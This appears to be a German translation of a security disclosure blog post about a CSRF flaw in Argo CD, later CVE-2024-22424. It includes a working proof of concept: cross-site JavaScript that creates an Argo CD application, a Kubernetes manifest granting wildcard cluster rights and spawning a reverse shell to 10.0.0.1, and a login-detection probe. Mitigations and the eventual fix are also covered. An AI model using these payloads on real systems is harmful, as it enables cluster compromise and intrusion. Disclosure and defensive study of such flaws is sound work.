# Argo CD (CSRF)

Die Argo CD ist der Schlüssel zu Produktionsservern und eine wichtige Komponente von CI/CD-Pipelines.

Bei einem kürzlichen Engagement lernten wir Argo CD kennen. Es wird auf derselben übergeordneten Domäne 
(„gleiche Site“) wie ein anderes von uns kontrolliertes Asset gehostet, 
daher haben wir über clientseitige Angriffsvektoren nachgedacht. 

## The vulnerability

Es ist seit Jahren öffentlich bekannt, dass die gesamte Argo CD-[[API]] anfällig für Cross-Site Request Forgery (CSRF) ist. 
Wir gehen davon aus, dass das Team dem Problem keine Priorität eingeräumt hat, da es keine Beweise dafür gibt, dass es sich um eine schwerwiegende Sicherheitslücke handelt.

Moderne Browser implementieren das Lax SameSite-Cookie-Attribut, um CSRF zu verhindern, es ist jedoch nicht narrensicher. 
Das samesite-Attribut wird unbrauchbar, wenn sich der Ursprung in derselben übergeordneten Domäne wie das Ziel befindet.

Um dies zu testen, erstellen wir eine Beispielumgebung mit Argo CD v2.8.2. 
Ein Angreifer kontrolliert Inhalte von marketing.victim.com (z. B. über Stored XSS) und möchte argocd.internal.victim.com ins Visier nehmen.

Der folgende Proof of Concept ermöglicht es dem Angreifer, über Argo CD einen Pod mit Administratorrechten auf dem Kubernetes-Cluster zu erstellen. 
Dieses Stück JavaScript wird auf der Homepage von marketing.victim.com eingefügt:

```JavaScript

var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');
xhr.setRequestHeader('Content-Type', 'text/plain')
xhr.withCredentials = true;
xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":
{"name":"test-app1"},"spec":{"destination":
{"name":"","namespace":"default","server":"https://
kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://
github.com/califio/argotest1","targetRevision":"HEAD"},"sources":
[],"project":"default","syncPolicy":{"automated":
{"prune":false,"selfHeal":false}}}}')

```

Dabei verweist repoURL auf ein Repository mit der Yaml-Definition wie:


```JavaScript

apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
---
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  serviceAccountName: my-sa
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: my-role
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: my-rolebinding
subjects:
- kind: ServiceAccount
  name: my-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: my-role
  apiGroup: rbac.authorization.k8s.io

```

Dann warte. Ein bei argocd.internal.victim.com angemeldeter Mitarbeiter führt beim Besuch von marketing.victim.com zu einer Kompromittierung des Kubernetes-Clusters.
Dies ist möglich, weil:

	+ Argo CD berücksichtigt den Content-Type-Header nicht. Wenn dies der Fall wäre, hätte die Anfrage eine Preflight-[[CORS]]-Anfrage auf „application/json“ CT ausgelöst und der Angriff schlägt fehl.
 
	+ Der Angreifer benötigt keinerlei Kenntnisse, um einen gültigen JSON zu erstellen. Der Clusterstandort, der Projektname usw. sind standardmäßig verfügbar.

Darüber hinaus können wir den Exploit gezielt einsetzen. Auf marketing.victim.com gibt es einen netten kleinen Trick, um zu überprüfen, ob der aktuell surfende Benutzer bei der Ziel-Argo-CD angemeldet ist oder nicht (Idee mit freundlicher Genehmigung eines Freundes von Calif):

```JavaScript

<script src="https://argocd.internal.victim.com/api/v1/projects"
onload="alert('Logged in to argocd')" onerror="alert('NOT logged in')"></
script>

```

Dies liegt daran, dass die [[API]] bei angemeldeten Anfragen 200 und andernfalls 403 zurückgibt.

In Wirklichkeit haben wir gewartet, bis unser Kunde etwas auf seiner Marketing-Website angekündigt hat. 
Dies lockte eine große Anzahl von Mitarbeitern dazu, die Nachrichten zu lesen, und wir bekamen sofort eine Shell.

## Suggestion

Wir haben dies Argo CD im September 2023 gemeldet, aber keine Antwort erhalten. Abgesehen von einem Patch schlagen wir die folgenden Abhilfemaßnahmen vor:

	+ Migrieren Sie Argo CD von übergeordneten Domänen, die nicht dieselbe Vertrauensstufe haben.

	+ Verkürzen Sie die Standardsitzungszeit von 24 Stunden auf 30 Minuten oder weniger

## Update

Das Team von Argo CD war seit der Veröffentlichung dieses Blogbeitrags ansprechbar und hat einige Tage später ein Update veröffentlicht. 
Dieses Problem ist jetzt CVE-2024-22424 und in den Versionen 2.9.4, 2.8.8 und 2.7.16 behoben.

Die erste Lösung bestand darin, gorilla-csrf zur Argo-CD hinzuzufügen. 
Ich hatte das Gefühl, dass dies nicht der richtige Weg war, das Problem anzugehen, und empfahl ihnen, den Content-Type-Header „application/json“ zu erzwingen. 
Das war ihre letzte Lösung. 

Wir danken den Argo CD-Betreuern für ihre Offenheit gegenüber Rückmeldungen und den reibungslosen Behebungsprozess.










